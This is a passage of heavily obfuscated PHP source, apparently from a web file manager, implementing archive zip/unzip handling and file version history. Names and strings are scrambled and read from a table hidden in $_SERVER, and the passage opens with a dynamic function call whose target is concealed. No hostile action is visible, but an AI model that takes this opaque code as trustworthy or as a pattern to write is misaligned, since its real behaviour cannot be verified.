$_SERVER[¶Ô„œ…¯][925]; $_act($_SERVER[$_SERVER[¶Ô„œ…¯][926]]); } goto eÇê©à¾Õ„; bŠ¥Ñ¡Ÿ‹ˆ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $äÖÍÎıÉ; if ($äÖÍÎıÉ) { return $äÖÍÎıÉ; } $èõÏ™­Ñ = IO::init($_SERVER[¶Ô„œ…¯][8]); return $èõÏ™­Ñ; } private static function iconvSystem($ö™šıö¿) { return self::local()->iconvSystem($ö™šıö¿); } private static function iconvApp($¥Õ‹É”) { return self::local()->iconvApp($¥Õ‹É”); } public static function zipFolder($à­¨ÍÙ¬, $ºäÙ£˜½ = "\x7a\151\x70", $öÜÕŞÚç = '', $Ç¤î»Û¯ = REPEAT_RENAME) { $¥™¸½Èú =& $_SERVER[¶Ô„œ…¯]; $´ÒŠë³Á = IO::listPath($à­¨ÍÙ¬); if (!$´ÒŠë³Á) { return !1; } $´ÒŠë³Á = array_merge($´ÒŠë³Á[$¥™¸½Èú[85]], $´ÒŠë³Á[$¥™¸½Èú[86]]); return self::zip($´ÒŠë³Á, $ºäÙ£˜½, $öÜÕŞÚç, $Ç¤î»Û¯); } public static function zip($¯óşí‘Ç, $ßëø¾ğ = "\172\151\x70", $êá¢®Ö¥ = '', $¿­©»Òä = REPEAT_RENAME) { $©µ×åá =& $_SERVER[¶Ô„œ…¯]; if (is_string($¯óşí‘Ç) && $¯óşí‘Ç) { $¯óşí‘Ç = array(array($©µ×åá[87] => $¯óşí‘Ç)); } $Ú­ÍÀ® = self::init($¯óşí‘Ç[0][$©µ×åá[87]]); $Ééé™ùç = self::info($¯óşí‘Ç[0][$©µ×åá[87]]); $µÑ„ğµ = $©µ×åá[12]; $•Ì¸Ü‰¼ = $©µ×åá[12]; $˜Ñï·—§ = $©µ×åá[12]; if ($êá¢®Ö¥ && substr($êá¢®Ö¥, -1, 1) != $©µ×åá[8]) { $•Ì¸Ü‰¼ = get_path_father($êá¢®Ö¥); $˜Ñï·—§ = get_path_this($êá¢®Ö¥); } else { $•Ì¸Ü‰¼ = self::pathFather($Ééé™ùç[$©µ×åá[87]]); $˜Ñï·—§ = $Ééé™ùç[$©µ×åá[32]] . $©µ×åá[10] . $ßëø¾ğ; if (count($¯óşí‘Ç) > 1) { $ş»¬İ¬ = IO::info($•Ì¸Ü‰¼); $˜Ñï·—§ = $ş»¬İ¬[$©µ×åá[32]] . $©µ×åá[10] . $ßëø¾ğ; } if ($êá¢®Ö¥) { $•Ì¸Ü‰¼ = $êá¢®Ö¥; } } if ($Ú­ÍÀ®->getType() == $©µ×åá[109]) { $»íÌÂíò = self::init($•Ì¸Ü‰¼); $î×¶ƒ’ = $»íÌÂíò->getType() == $©µ×åá[109] ? $•Ì¸Ü‰¼ : get_path_father($Ú­ÍÀ®->path); $î×¶ƒ’ = rtrim($î×¶ƒ’, $©µ×åá[8]) . $©µ×åá[8]; mk_dir($î×¶ƒ’); } else { $µÑ„ğµ = TEMP_FILES . $©µ×åá[1272] . time() . rand_string(8) . $©µ×åá[8]; mk_dir($µÑ„ğµ); file_put_contents($µÑ„ğµ . $©µ×åá[1273], $©µ×åá[12]); $î×¶ƒ’ = $µÑ„ğµ; } $ö’—ÖÖ = IO::info($î×¶ƒ’); if (!$ö’—ÖÖ || !$ö’—ÖÖ[$©µ×åá[235]]) { show_json(LNG($©µ×åá[1274]), !1); } $çğÈæ¢Ó = self::zipFileList($¯óşí‘Ç, $µÑ„ğµ); foreach ($çğÈæ¢Ó as $ôûİôÄ« => $ÒöÆ§³ö) { $çğÈæ¢Ó[$ôûİôÄ«] = self::iconvSystem($ÒöÆ§³ö); } $€ÚÜÙó = get_filename_auto($î×¶ƒ’ . $˜Ñï·—§, $©µ×åá[12], $¿­©»Òä); KodArchive::create(self::iconvSystem($€ÚÜÙó), $çğÈæ¢Ó); if (!IO::exist($€ÚÜÙó)) { if ($µÑ„ğµ) { del_dir($µÑ„ğµ); } write_log($©µ×åá[1275] . $€ÚÜÙó, $©µ×åá[390]); show_json(LNG($©µ×åá[1276]), !1); } if (!$µÑ„ğµ) { return $€ÚÜÙó; } $¨÷½ù¥ = self::move($€ÚÜÙó, $•Ì¸Ü‰¼, $¿­©»Òä); if ($µÑ„ğµ) { del_dir($µÑ„ğµ); } if (!$€ÚÜÙó) { write_log($©µ×åá[1277] . $€ÚÜÙó . $©µ×åá[1278] . $•Ì¸Ü‰¼, $©µ×åá[390]); show_json(LNG($©µ×åá[1276]), !1); } return $¨÷½ù¥; } public static function unzip($¾¼ĞƒÁÜ, $É¼Û£ÅÖ, $íĞ öî = "\x2d\x31", $Í¡£ŸÍ— = "\x72\145\160\154\141\x63\145") { $î³®ÓùÂ =& $_SERVER[¶Ô„œ…¯]; $«™ı¡ğø = parent::info($¾¼ĞƒÁÜ); if (!$«™ı¡ğø) { show_json(LNG($î³®ÓùÂ[1279]), !1); } $ˆ“¯æùÒ = IO::infoFullSimple($É¼Û£ÅÖ); if (!$ˆ“¯æùÒ) { $É¼Û£ÅÖ = IO::mkdir($É¼Û£ÅÖ); } if (isset($ˆ“¯æùÒ[$î³®ÓùÂ[193]]) && trim($ˆ“¯æùÒ[$î³®ÓùÂ[87]], $î³®ÓùÂ[8]) != trim($É¼Û£ÅÖ, $î³®ÓùÂ[8])) { $çĞ‹îÉ¡ = KodIO::make($ˆ“¯æùÒ[$î³®ÓùÂ[192]]); $€…­šª‰ = IO::fileNameAuto($çĞ‹îÉ¡, $ˆ“¯æùÒ[$î³®ÓùÂ[32]], REPEAT_RENAME_FOLDER, !0); $É¼Û£ÅÖ = IO::mkdir($çĞ‹îÉ¡ . $€…­šª‰); } $íĞ öî = $íĞ öî && $íĞ öî != $î³®ÓùÂ[1280] ? @json_decode($íĞ öî, !0) : -1; $•õï¦º² = self::unzipPart($¾¼ĞƒÁÜ, $íĞ öî); if (!$•õï¦º² || !IO::exist($•õï¦º²[$î³®ÓùÂ[232]])) { show_json(LNG($î³®ÓùÂ[108]), !1); } $¾·Óâ¿– = $•õï¦º²[$î³®ÓùÂ[1281]][count($•õï¦º²[$î³®ÓùÂ[1281]]) - 1]; if ($¾·Óâ¿–[$î³®ÓùÂ[1282]] == -1 || substr($¾·Óâ¿–[$î³®ÓùÂ[32]], -1, 1) == $î³®ÓùÂ[8]) { $ù”÷ñí° = $•õï¦º²[$î³®ÓùÂ[1283]] . rand_string(10) . $î³®ÓùÂ[8]; mk_dir($ù”÷ñí°); $˜ÄÀ‘›Ï = count($•õï¦º²[$î³®ÓùÂ[1281]]) == 1 ? IO::ext($¾¼ĞƒÁÜ) : get_path_ext($•õï¦º²[$î³®ÓùÂ[232]]); $„‹šáå± = KodArchive::extract(self::iconvSystem($•õï¦º²[$î³®ÓùÂ[232]]), $ù”÷ñí°, $¾·Óâ¿–[$î³®ÓùÂ[1282]], $€…­šª‰, $˜ÄÀ‘›Ï); self::unzipErrorCheck($„‹šáå±, array($î³®ÓùÂ[1284], $¾¼ĞƒÁÜ, $˜ÄÀ‘›Ï, $É¼Û£ÅÖ, $•õï¦º²)); Hook::trigger($î³®ÓùÂ[1285], $ù”÷ñí°); recursion_dir($ù”÷ñí°, $œó‰Óş¹, $â¨á“£Š, 0); $ÔùÆè‚É = array_merge($œó‰Óş¹, $â¨á“£Š); $ì˜ú¬Ïö = array(); foreach ($ÔùÆè‚É as $ç±ªÊ·¦) { $ıÏúØîÑ = IO::move(self::iconvApp($ç±ªÊ·¦), $É¼Û£ÅÖ, $Í¡£ŸÍ—); if ($ıÏúØîÑ) { $ì˜ú¬Ïö[] = $ıÏúØîÑ; } } del_dir($ù”÷ñí°); } else { $ıÏúØîÑ = IO::move($•õï¦º²[$î³®ÓùÂ[232]], $É¼Û£ÅÖ, $Í¡£ŸÍ—, get_path_this($¾·Óâ¿–[$î³®ÓùÂ[32]])); if ($ıÏúØîÑ) { $ì˜ú¬Ïö[] = $ıÏúØîÑ; } } return $ì˜ú¬Ïö ? $ì˜ú¬Ïö : !1; } public static function unzipList($Ş©¿Ä¹Ó) { $ÚÍ…ç³ş =& $_SERVER[¶Ô„œ…¯]; $¹Ğ¢¿¼ = isset($Ş©¿Ä¹Ó[$ÚÍ…ç³ş[1286]]) ? $Ş©¿Ä¹Ó[$ÚÍ…ç³ş[1286]] : !1; $ÅÒÙÚ³Ô = isset($Ş©¿Ä¹Ó[$ÚÍ…ç³ş[1282]]) ? @json_decode($Ş©¿Ä¹Ó[$ÚÍ…ç³ş[1282]], !0) : -1; $ËñĞéïÏ = self::unzipPart($Ş©¿Ä¹Ó[$ÚÍ…ç³ş[87]], $ÅÒÙÚ³Ô); if (!$ËñĞéïÏ || !IO::exist($ËñĞéïÏ[$ÚÍ…ç³ş[232]])) { show_json(LNG($ÚÍ…ç³ş[108]), !1); } $…Ø­Š…‡ = $ËñĞéïÏ[$ÚÍ…ç³ş[1281]][count($ËñĞéïÏ[$ÚÍ…ç³ş[1281]]) - 1]; $±—ƒŒÌ¡ = in_array(IO::ext($ËñĞéïÏ[$ÚÍ…ç³ş[232]]), array($ÚÍ…ç³ş[390], $ÚÍ…ç³ş[1287], $ÚÍ…ç³ş[1288], $ÚÍ…ç³ş[1289], $ÚÍ…ç³ş[1290], $ÚÍ…ç³ş[1291])); if (!$¹Ğ¢¿¼ && ($…Ø­Š…‡[$ÚÍ…ç³ş[1282]] == -1 || $±—ƒŒÌ¡)) { $úúşçŞœ = $ËñĞéïÏ[$ÚÍ…ç³ş[1283]] . get_path_this($ËñĞéïÏ[$ÚÍ…ç³ş[232]]) . $ÚÍ…ç³ş[1292]; if (!IO::exist($úúşçŞœ)) { $åÒ€İÀë = $…Ø­Š…‡[$ÚÍ…ç³ş[1282]] == -1 ? get_path_ext(IO::pathThis($Ş©¿Ä¹Ó[$ÚÍ…ç³ş[87]])) : get_path_ext($ËñĞéïÏ[$ÚÍ…ç³ş[232]]); $òÀÀ™Ñ• = KodArchive::listContent(self::iconvSystem($ËñĞéïÏ[$ÚÍ…ç³ş[232]]), !0, $åÒ€İÀë); self::unzipErrorCheck($òÀÀ™Ñ•, array($ÚÍ…ç³ş[1293], $Ş©¿Ä¹Ó, $ËñĞéïÏ)); @file_put_contents($úúşçŞœ, json_encode($òÀÀ™Ñ•[$ÚÍ…ç³ş[1294]])); } return @json_decode(IO::getContent($úúşçŞœ), !0); } IO::fileOut($ËñĞéïÏ[$ÚÍ…ç³ş[232]], $¹Ğ¢¿¼, get_path_this($…Ø­Š…‡[$ÚÍ…ç³ş[32]])); die; } private static function zipFileList($—è‹Ô’Ÿ, $ø‚’Œ×í = false) { $®´Üëç˜ =& $_SERVER[¶Ô„œ…¯]; $É¤Æ·Ş¯ = array(); foreach ($—è‹Ô’Ÿ as $ºÃ“æÉ–) { $ŒÚÆÍÅ = $ºÃ“æÉ–[$®´Üëç˜[87]]; if ($ø‚’Œ×í) { $ŒÚÆÍÅ = self::copy($ºÃ“æÉ–[$®´Üëç˜[87]], $ø‚’Œ×í, $®´Üëç˜[897]); } else { $…ıûÁ¿¦ = self::init($ºÃ“æÉ–[$®´Üëç˜[87]]); if ($…ıûÁ¿¦->getType() == $®´Üëç˜[109]) { $ŒÚÆÍÅ = $…ıûÁ¿¦->path; } } if ($ŒÚÆÍÅ && self::local()->exist($ŒÚÆÍÅ)) { $É¤Æ·Ş¯[$ºÃ“æÉ–[$®´Üëç˜[87]]] = $ŒÚÆÍÅ; } } if (!empty($É¤Æ·Ş¯)) { return array_values($É¤Æ·Ş¯); } show_json(LNG($®´Üëç˜[1253]), !1); } private static function localFilePath($÷ù£Î®È) { $Äò´Ñ =& $_SERVER[¶Ô„œ…¯]; $¼á±ÀÑ = KodIO::parse($÷ù£Î®È); if ($¼á±ÀÑ[$Äò´Ñ[33]] == KodIO::KOD_SOURCE) { $Ç–¹¢†„ = Model($Äò´Ñ[903])->fileInfoGet(KodIO::sourceID($÷ù£Î®È)); if (!$Ç–¹¢†„[$Äò´Ñ[87]]) { show_json($Äò´Ñ[1295], !1); } $÷ù£Î®È = $Ç–¹¢†„[$Äò´Ñ[87]]; } $ïÇ¼†¼Û = self::init($÷ù£Î®È); if ($ïÇ¼†¼Û->pathParse[$Äò´Ñ[1239]]) { $÷ù£Î®È = $ïÇ¼†¼Û->pathParse[$Äò´Ñ[1239]]; $ïÇ¼†¼Û = self::init($÷ù£Î®È); } $òÓÂ€Ç¦ = $ïÇ¼†¼Û->getType(); if ($òÓÂ€Ç¦ == $Äò´Ñ[109] || $òÓÂ€Ç¦ == $Äò´Ñ[1296]) { if (!$ïÇ¼†¼Û->exist($ïÇ¼†¼Û->path)) { show_json(LNG($Äò´Ñ[108]), !1); } return $ïÇ¼†¼Û->path; } return !1; } public static function unzipPart($éö×ªĞÔ, $«Œ¡áñ” = -1) { $”¹ÀòïÃ =& $_SERVER[¶Ô„œ…¯]; $šå–¤è = IO::pathThis($éö×ªĞÔ); if (!$«Œ¡áñ” || $«Œ¡áñ” == -1) { $½Š›àæ = array(array($”¹ÀòïÃ[32] => $šå–¤è, $”¹ÀòïÃ[1282] => -1)); $½Š›àæ[0][$”¹ÀòïÃ[1297]] = $½Š›àæ[0][$”¹ÀòïÃ[32]]; } else { if (is_array($«Œ¡áñ”)) { $½Š›àæ = $«Œ¡áñ”; $ÌÈ¢¢¤ş = count($½Š›àæ) - 1; for ($®¹¯µÄ˜ = 0; $®¹¯µÄ˜ <= $ÌÈ¢¢¤ş; $®¹¯µÄ˜++) { $¦À½øÖÂ = $½Š›àæ[$®¹¯µÄ˜]; $ƒì²ÏŞÓ = get_path_this($¦À½øÖÂ[$”¹ÀòïÃ[32]]) . (checkExtSafe($¦À½øÖÂ[$”¹ÀòïÃ[32]]) ? $”¹ÀòïÃ[12] : $”¹ÀòïÃ[1298]); $½Š›àæ[$®¹¯µÄ˜][$”¹ÀòïÃ[1297]] = $”¹ÀòïÃ[1299] . intval($¦À½øÖÂ[$”¹ÀòïÃ[1282]]) . $”¹ÀòïÃ[464] . $ƒì²ÏŞÓ; if ($®¹¯µÄ˜ == 0) { continue; } $½Š›àæ[$®¹¯µÄ˜][$”¹ÀòïÃ[1297]] = $½Š›àæ[$®¹¯µÄ˜ - 1][$”¹ÀòïÃ[1297]] . $”¹ÀòïÃ[1300] . $½Š›àæ[$®¹¯µÄ˜][$”¹ÀòïÃ[1297]]; } } } if (!is_array($½Š›àæ) || count($½Š›àæ) == 0) { return !1; } $°ÇÓöú = $½Š›àæ[count($½Š›àæ) - 1]; if (!IO::exist($éö×ªĞÔ)) { return !1; } $¿ªºå˜§ = TEMP_FILES . $”¹ÀòïÃ[1301] . kodIO::hashPathSafe($éö×ªĞÔ) . $”¹ÀòïÃ[8]; $®¤Óı…Ú = $¿ªºå˜§ . $°ÇÓöú[$”¹ÀòïÃ[1297]]; mk_dir($¿ªºå˜§); file_put_contents(TEMP_FILES . $”¹ÀòïÃ[1273], $”¹ÀòïÃ[12]); if (IO::exist($®¤Óı…Ú)) { return array($”¹ÀòïÃ[232] => $®¤Óı…Ú, $”¹ÀòïÃ[1281] => $½Š›àæ, $”¹ÀòïÃ[1283] => $¿ªºå˜§); } $èÆ¦«ï“ = self::localFilePath($éö×ªĞÔ); if (!$èÆ¦«ï“) { $èÆ¦«ï“ = $¿ªºå˜§ . $”¹ÀòïÃ[1302]; if (!IO::exist($èÆ¦«ï“)) { self::copy($éö×ªĞÔ, $¿ªºå˜§, !1, get_path_this($èÆ¦«ï“)); } } if (!$èÆ¦«ï“ || !IO::exist($èÆ¦«ï“)) { return !1; } if ($°ÇÓöú[$”¹ÀòïÃ[1282]] == -1) { return array($”¹ÀòïÃ[232] => $èÆ¦«ï“, $”¹ÀòïÃ[1281] => $½Š›àæ, $”¹ÀòïÃ[1283] => $¿ªºå˜§); } $ßÑœİùò = $èÆ¦«ï“; foreach ($½Š›àæ as $®¹¯µÄ˜ => $¦À½øÖÂ) { if (!$¦À½øÖÂ || $¦À½øÖÂ[$”¹ÀòïÃ[1282]] == $”¹ÀòïÃ[1280]) { break; } if (substr($¦À½øÖÂ[$”¹ÀòïÃ[32]], -1, 1) == $”¹ÀòïÃ[8]) { break; } $Ì¶ş”¿ = in_array(get_path_ext($¦À½øÖÂ[$”¹ÀòïÃ[1297]]), array($”¹ÀòïÃ[390], $”¹ÀòïÃ[1287], $”¹ÀòïÃ[1288], $”¹ÀòïÃ[1289], $”¹ÀòïÃ[1290], $”¹ÀòïÃ[1291])); $âÀªƒ³¹ = $®¹¯µÄ˜ == count($½Š›àæ) - 1 && $Ì¶ş”¿; $ß©£ÊÅ‰ = $¿ªºå˜§ . $¦À½øÖÂ[$”¹ÀòïÃ[1297]]; $ıÒÈ€¨÷ = $¿ªºå˜§ . get_path_this($¦À½øÖÂ[$”¹ÀòïÃ[32]]); if (IO::exist($ß©£ÊÅ‰)) { $ßÑœİùò = $ß©£ÊÅ‰; continue; } $ÄŸõ§ïµ = $®¹¯µÄ˜ == 0 ? get_path_ext($šå–¤è) : get_path_ext($ßÑœİùò); $¼ò‰Ï  = KodArchive::extract(self::iconvSystem($ßÑœİùò), $¿ªºå˜§, $¦À½øÖÂ[$”¹ÀòïÃ[1282]], $Â…±Òœì, $ÄŸõ§ïµ); self::unzipErrorCheck($¼ò‰Ï , array($”¹ÀòïÃ[1303], $éö×ªĞÔ, $½Š›àæ, $¦À½øÖÂ, $ß©£ÊÅ‰)); if (IO::exist($ıÒÈ€¨÷)) { IO::rename($ıÒÈ€¨÷, get_path_this($ß©£ÊÅ‰)); } $ßÑœİùò = $ß©£ÊÅ‰; } $®¤Óı…Ú = $ßÑœİùò; return array($”¹ÀòïÃ[232] => $ßÑœİùò, $”¹ÀòïÃ[1281] => $½Š›àæ, $”¹ÀòïÃ[1283] => $¿ªºå˜§); } private static function unzipErrorCheck($–ßÇ§¹, $ÚÂä®• = false) { $ŒÉï±Â =& $_SERVER[¶Ô„œ…¯]; if ($–ßÇ§¹[$ŒÉï±Â[1304]]) { return !0; } write_log(array($ŒÉï±Â[1305], $–ßÇ§¹, $ÚÂä®•), $ŒÉï±Â[1306]); show_json($ŒÉï±Â[1307] . json_encode($–ßÇ§¹[$ŒÉï±Â[1294]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $¹Ó­‰Üá =& $_SERVER[¶Ô„œ…¯]; $÷®¹Ñæ = $GLOBALS[$¹Ó­‰Üá[6]][$¹Ó­‰Üá[92]]; if ($÷®¹Ñæ[$¹Ó­‰Üá[1308]] != 1) { return; } if ($÷®¹Ñæ[$¹Ó­‰Üá[1309]] <= 0) { return; } if (isset($_REQUEST[$¹Ó­‰Üá[1310]]) && $_REQUEST[$¹Ó­‰Üá[1310]] == $¹Ó­‰Üá[91]) { return; } Hook::bind($¹Ó­‰Üá[1311], $¹Ó­‰Üá[1312]); Hook::bind($¹Ó­‰Üá[1313], $¹Ó­‰Üá[1314]); Hook::bind($¹Ó­‰Üá[1315], $¹Ó­‰Üá[1316]); Hook::bind($¹Ó­‰Üá[1317], $¹Ó­‰Üá[1318]); Hook::bind($¹Ó­‰Üá[1319], $¹Ó­‰Üá[1320]); Hook::bind($¹Ó­‰Üá[1321], $¹Ó­‰Üá[1322]); } public static function eventBeforeUpload($ıÕÁ‚§Ò) { if ($ıÕÁ‚§Ò[3] && $ıÕÁ‚§Ò[3] != REPEAT_REPLACE) { return; } $ÆÔñ„’î = self::parsePath($ıÕÁ‚§Ò[0]); if (!$ÆÔñ„’î) { return; } self::add($ÆÔñ„’î); } public static function eventBeforeEdit($‚Ù”Ÿ¯¹) { $ØÌ©©êì = self::parsePath($‚Ù”Ÿ¯¹[0]); if (!$ØÌ©©êì) { return; } self::add($ØÌ©©êì); } public static function eventBeforeCopyFile($ŞÎ’’ğá, $šş¸ÅÓ£, $¡øòéÉŞ, $™‘†‹, $Œ‘¬ƒº, $ï…šÂ£…) { $›„ú¯‘ =& $_SERVER[¶Ô„œ…¯]; if (isset($¡øòéÉŞ->_data[$›„ú¯‘[1243]]) && $¡øòéÉŞ->_data[$›„ú¯‘[1243]]) { return; } $Ö®Î´§‹ = $¡øòéÉŞ->getPathOuter($™‘†‹); $ÁüèĞç€ = self::parsePath($Ö®Î´§‹); if (!$ÁüèĞç€) { return; } self::add($ÁüèĞç€); } public static function eventBeforeRename($œõËÅŞÚ) { $£çóß¾ =& $_SERVER[¶Ô„œ…¯]; $„¸£ş½‰ = self::parsePath($œõËÅŞÚ[0]); if (!$„¸£ş½‰) { return; } $ÂÁäŞ–Ê = self::checkInHistory($„¸£ş½‰); if (!$ÂÁäŞ–Ê) { return; } if ($ÂÁäŞ–Ê[$£çóß¾[33]] == $£çóß¾[232]) { $ßÌñä³ª = self::listData($„¸£ş½‰); if ($ßÌñä³ª && $ßÌñä³ª[$£çóß¾[447]]) { self::moveHistory($„¸£ş½‰, $œõËÅŞÚ[1]); } } else { IO::rename($ÂÁäŞ–Ê[$£çóß¾[87]], $œõËÅŞÚ[1]); } } public static function eventBeforeMove($Ş¿•ğ§) { $ä‘ˆˆó =& $_SERVER[¶Ô„œ…¯]; $½¦‚×á½ = self::parsePath($Ş¿•ğ§[0]); if (!$½¦‚×á½) { return; } $™®•¹ê¯ = self::parsePath($Ş¿•ğ§[1]); if (!$™®•¹ê¯) { return; } $ŠÀ¼şÕæ = $Ş¿•ğ§[3]; $¹ú öèÑ = self::checkInHistory($½¦‚×á½); if (!$¹ú öèÑ) { return; } $Õ¬Ş™à˜ = self::pathHistory($™®•¹ê¯); if ($¹ú öèÑ[$ä‘ˆˆó[33]] == $ä‘ˆˆó[232]) { $˜¡¥ßß” = self::listData($½¦‚×á½); $Òá­‰‘ı = rtrim($™®•¹ê¯, $ä‘ˆˆó[8]) . $ä‘ˆˆó[8] . ($ŠÀ¼şÕæ ? $ŠÀ¼şÕæ : get_path_this($½¦‚×á½)); $¬Ö¶Ÿò = self::listData($Òá­‰‘ı); if ($˜¡¥ßß” && $˜¡¥ßß”[$ä‘ˆˆó[447]] && $¬Ö¶Ÿò && $¬Ö¶Ÿò[$ä‘ˆˆó[447]]) { return self::clear($½¦‚×á½); } if ($˜¡¥ßß” && $˜¡¥ßß”[$ä‘ˆˆó[447]]) { self::moveHistory($½¦‚×á½, $ŠÀ¼şÕæ, $Õ¬Ş™à˜); } } else { IO::move($¹ú öèÑ[$ä‘ˆˆó[87]], $Õ¬Ş™à˜, !1, $ŠÀ¼şÕæ); self::clearEmptyFolder(IO::pathFather($¹ú öèÑ[$ä‘ˆˆó[87]])); } } public static function eventAfterRemove($¿ìÚ€œ, $óÇØ‚’§) { $¸à§÷„ =& $_SERVER[¶Ô„œ…¯]; if (!$óÇØ‚’§) { return; } $âæûéšº = self::parsePath($¿ìÚ€œ[0]); if (!$âæûéšº) { return; } $ƒá£í¨’ = self::checkInHistory($âæûéšº); if (!$ƒá£í¨’) { return; } if ($ƒá£í¨’[$¸à§÷„[33]] == $¸à§÷„[232]) { $ˆø„ñÜÛ = self::listData($âæûéšº, !1); if ($ˆø„ñÜÛ && $ˆø„ñÜÛ[$¸à§÷„[447]]) { self::clear($âæûéšº, !1); } } else { IO::remove($ƒá£í¨’[$¸à§÷„[87]]); self::clearEmptyFolder(IO::pathFather($ƒá£í¨’[$¸à§÷„[87]])); } } private static function checkInHistory($ĞÇü£ÏÌ) { $È¤ìÓª¥ = self::pathHistory($ĞÇü£ÏÌ); if (!IO::exist($È¤ìÓª¥)) { $È¤ìÓª¥ .= $_SERVER[¶Ô„œ…¯][1323]; } return IO::exist($È¤ìÓª¥) ? IO::info($È¤ìÓª¥) : !1; } private static function parsePath($…”éğÒö) { $ˆİ‚ŒÀ· =& $_SERVER[¶Ô„œ…¯]; if (!$…”éğÒö) { return !1; } if (isset($GLOBALS[$ˆİ‚ŒÀ·[1324]]) && $GLOBALS[$ˆİ‚ŒÀ·[1324]]) { return; } $Ò…“ıåó = KodIO::parse($…”éğÒö); $×Ùı­»Á = $Ò…“ıåó[$ˆİ‚ŒÀ·[33]]; $­âÅ¾õ­ = !$×Ùı­»Á || $×Ùı­»Á == KodIO::KOD_IO || $×Ùı­»Á == KodIO::KOD_SHARE_ITEM; if (!$­âÅ¾õ­ || !$Ò…“ıåó[$ˆİ‚ŒÀ·[1325]]) { return !1; } if (substr($…”éğÒö, 0, strlen(DATA_PATH . $ˆİ‚ŒÀ·[1326])) == DATA_PATH . $ˆİ‚ŒÀ·[1326]) { return !1; } if ($×Ùı­»Á == KodIO::KOD_SHARE_ITEM) { $—‡à‰Şù = IO::init($…”éğÒö); if ($—‡à‰Şù->pathParse[$ˆİ‚ŒÀ·[1239]]) { return self::parsePath($—‡à‰Şù->pathParse[$ˆİ‚ŒÀ·[1239]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ñ“ò»Ñ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ˆİ‚ŒÀ·[1327]); foreach ($Ñ“ò»Ñ as $óõßÂêÅ) { if (!$×Ùı­»Á && substr($…”éğÒö, 0, strlen($óõßÂêÅ)) == $óõßÂêÅ) { return !1; } } self::log($GLOBALS[$ˆİ‚ŒÀ·[1234]] . $ˆİ‚ŒÀ·[1328] . $…”éğÒö); return $…”éğÒö; } private static function pathHistory($Ëˆà¡‘) { $Î„‘‘üÀ =& $_SERVER[¶Ô„œ…¯]; $‚ é‰È = self::$_historyBase . ltrim(KodIO::clear($Ëˆà¡‘), $Î„‘‘üÀ[8]); $‚ é‰È = str_replace(array($Î„‘‘üÀ[1329]), array($Î„‘‘üÀ[1330]), $‚ é‰È); return $‚ é‰È; } public static function log($…Ù¤Ÿš˜) { } public static function historyCount($¨¡š‘„©) { $í³æ±æ¬ =& $_SERVER[¶Ô„œ…¯]; $å›ï†ÊÛ = array(); $Ã£ì÷…Ú = array(); foreach ($¨¡š‘„© as $½°ç“Ğœ) { $æ¦ÍŠ›ş = get_path_father($½°ç“Ğœ); if (!$Ã£ì÷…Ú[$æ¦ÍŠ›ş]) { $Ã£ì÷…Ú[$æ¦ÍŠ›ş] = array(); } $Ã£ì÷…Ú[$æ¦ÍŠ›ş][] = get_path_this($½°ç“Ğœ); } foreach ($Ã£ì÷…Ú as $æ¦ÍŠ›ş => $èÉÑœÇ) { $´İµ„¤ = self::parsePath($æ¦ÍŠ›ş); if (!$´İµ„¤) { continue; } foreach ($èÉÑœÇ as $½¾’² É) { $ç†Á±® = self::listData(rtrim($´İµ„¤, $í³æ±æ¬[8]) . $í³æ±æ¬[8] . $½¾’² É, !1); if ($ç†Á±® && $ç†Á±®[$í³æ±æ¬[447]]) { $å›ï†ÊÛ[rtrim($æ¦ÍŠ›ş, $í³æ±æ¬[8]) . $í³æ±æ¬[8] . $½¾’² É] = count($ç†Á±®[$í³æ±æ¬[447]]); } } } return $å›ï†ÊÛ; } public static function add($ÀèÜš•) { $Òú¡ÉĞ” =& $_SERVER[¶Ô„œ…¯]; $ş£§‘ŠÒ = self::listData($ÀèÜš•); if (!$ş£§‘ŠÒ) { return; } $ÁéôòàÒ = Model($Òú¡ÉĞ”[848])->get($Òú¡ÉĞ”[1331]); $ÊöŸ¨õ¯ = intval($GLOBALS[$Òú¡ÉĞ”[6]][$Òú¡ÉĞ”[92]][$Òú¡ÉĞ”[1309]]); $ŠÆõ‹³ê = $ÁéôòàÒ == $Òú¡ÉĞ”[1332] ? min(5, $ÊöŸ¨õ¯) : $ÊöŸ¨õ¯; if ($ÊöŸ¨õ¯ <= 0) { return; } $í•âğÅí = IO::info($ÀèÜš•); $ÕÉ‚ã§ = $ş£§‘ŠÒ[$Òú¡ÉĞ”[447]]; if ($í•âğÅí[$Òú¡ÉĞ”[79]] == 0) { return; } if ($í•âğÅí[$Òú¡ÉĞ”[79]] >= 1024 * 1024 * 500) { return !1; } $äú£Ò÷Î = IO::hashSimple($ÀèÜš•); if ($ÕÉ‚ã§ && $ÕÉ‚ã§[0][$Òú¡ÉĞ”[677]] == $äú£Ò÷Î) { return !0; } if (array_key_exists($Òú¡ÉĞ”[235], $í•âğÅí) && !$í•âğÅí[$Òú¡ÉĞ”[235]]) { return !1; } $µøğœÏ² = short_id(time()); $ÛßÏ·Ò = array($Òú¡ÉĞ”[477] => $µøğœÏ², $Òú¡ÉĞ”[677] => $äú£Ò÷Î, $Òú¡ÉĞ”[32] => $í•âğÅí[$Òú¡ÉĞ”[32]] . $Òú¡ÉĞ”[10] . date($Òú¡ÉĞ”[1333]) . rand_string(1), $Òú¡ÉĞ”[79] => $í•âğÅí[$Òú¡ÉĞ”[79]], $Òú¡ÉĞ”[529] => USER_ID, $Òú¡ÉĞ”[233] => time(), $Òú¡ÉĞ”[1334] => $Òú¡ÉĞ”[12]); IO::mkdir($ş£§‘ŠÒ[$Òú¡ÉĞ”[1335]]); $„‹ìÈÔÎ = IO::copy($ÀèÜš•, $ş£§‘ŠÒ[$Òú¡ÉĞ”[1335]], !1, $ÛßÏ·Ò[$Òú¡ÉĞ”[32]]); if (!$„‹ìÈÔÎ) { self::clearEmptyFolder($ş£§‘ŠÒ[$Òú¡ÉĞ”[1335]]); return !1; } array_unshift($ÕÉ‚ã§, $ÛßÏ·Ò); if (count($ÕÉ‚ã§) > $ŠÆõ‹³ê) { $ñ«Çİ˜ä = array_slice($ÕÉ‚ã§, $ŠÆõ‹³ê); foreach ($ñ«Çİ˜ä as $¼¼¢øƒ) { IO::remove($ş£§‘ŠÒ[$Òú¡ÉĞ”[1335]] . $¼¼¢øƒ[$Òú¡ÉĞ”[32]]); } $ÕÉ‚ã§ = array_slice($ÕÉ‚ã§, 0, $ŠÆõ‹³ê); } return self::saveData($ş£§‘ŠÒ[$Òú¡ÉĞ”[1336]], 